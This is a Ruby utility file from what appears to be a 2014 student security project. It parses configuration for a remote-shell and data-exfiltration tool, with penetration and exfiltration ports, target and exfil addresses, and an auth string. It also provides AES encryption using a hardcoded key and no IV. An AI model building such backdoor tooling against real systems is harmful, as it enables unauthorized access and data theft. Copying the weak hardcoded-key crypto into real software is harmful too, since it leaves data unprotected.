=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   util.rb - Server and Client utility functions and data
--
-- PROGRAM:       util
--                This is not an executable program
--
-- FUNCTIONS:     Encryption, Decryption, File I/O
--
-- Ruby Gems req: ipaddress
--                https://rubygems.org/gems/ipaddress
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         Util currently supported to parse TCP & UDP configuration items
---------------------------------------------------------------------------------------
=end
$KEY = OpenSSL::Digest::SHA256.new("wowsuchsecretkey").digest
TCP = "tcp"
UDP = "udp"
AUTH_STRING = "echidna"
MODE_SHELL = "shell"
MODE_WATCH = "watch"

# Displays message and then exits program
#
# @param [String] reason
# - message to display before exiting
def exit_reason(reason)
    puts reason
    exit
end

# Start loading the configuration file.
# Checks if exists, if not, creates default
def load_config_file
  if File.exists? CONFIG_FILE
    validate_config
  else
    create_default_config
  end 
end

# Creates the default configuration file
# File name specified above
def create_default_config
  File.open(CONFIG_FILE, 'a') do |f|
      f.write(CONFIG_FILE_DEFAULT)
  end
  exit_reason(CONFIG_CREATE)
end

# Validates configuration protocols
# Implemented protocols: TCP, UDP
# @params [String] protocol
# - configuration string to validate
# @returns [Boolean]
# - True if valid, false if not
def valid_protocol(protocol)
  protocol.downcase!
  case protocol
  when TCP
    return true
  when UDP
    return true
  else
    return false
  end
end

# Valudates the configuration file lines
def validate_config
  file = ""
  File.open(CONFIG_FILE, "r") { |f| file = f.readlines }
  file.each do |l|
    l.strip!
    if l[0] == '#' #line is comment
      next
    elsif l.include? '='
      pair = l.split('=')
      begin
        pair[0].strip!
        pair[1].strip!
      rescue #if strip fails, pair is blank, bad config
        exit_reason(CONFIG_INVALID)
      end

      case pair[0]
      when "pen_prot"
        if valid_protocol(pair[1])
          $cfg_pen_protocol = pair[1]
        end
      when "pen_port"
        if valid_port(pair[1].to_i)
          $cfg_pen_port = pair[1].to_i
        end
      when "exfil_prot"
        if valid_protocol(pair[1])
          $cfg_exfil_protocol = pair[1]
        end
      when "exfil_port"
        if valid_port(pair[1].to_i)
          $cfg_exfil_port = pair[1].to_i
        end
      when "interface"
        #interface validation?
        $cfg_iface = pair[1]
      when "target_ip"
        #IP validation in client
        $cfg_target_ip = pair[1]
      when "exfil_addr"
        #IP validation in server
        $cfg_exfil_ip = pair[1]
      when "ttl"
        $cfg_exfil_ttl = pair[1]
      end
    end
  end
  #check if all items are present
  if $cfg_pen_protocol == nil || $cfg_exfil_protocol == nil \
    || $cfg_iface == nil || $cfg_pen_port == nil \
    || $cfg_exfil_port == nil
    exit_reason(CONFIG_INVALID)
  end
end

# Checks port range validity (1-65535)
#
# @param [Integer] num
# - port to check
# @return [bool]
# - true if valid, false if not
def valid_port(num)
    if num >= 1 && num <= 65535
      return true
    else
      return false
    end
end

# Validates IP Addresses
#
# @param [String] ip
# - IP Addr to validate
# @return [Boolean]
# true if valid, false if not
def validate_target_ip(ip)
  if !IPAddress.valid_ipv4?(ip)
    exit_reason("Invalid target ip address")
  end
end

# Encrypts a message for transmission
#
# @param [String] msg 
# - msg to encrypt
# @return [String]
# - encrypted payload
def encrypt(msg)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.encrypt

  cipher.key = $KEY

  begin
      payload = cipher.update(msg) + cipher.final
  rescue Exception => e
      puts "encryption error"
  end
  return payload
end

# Decrypts a received message
#
# @param [String] payload 
# - data to decrypt
# @return [String]
# - decrypted message
def decrypt(payload)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.decrypt

  cipher.key = $KEY

  begin
      msg = cipher.update(payload) + cipher.final
  rescue Exception => e
      puts "other decryption error"
  end
  return msg
end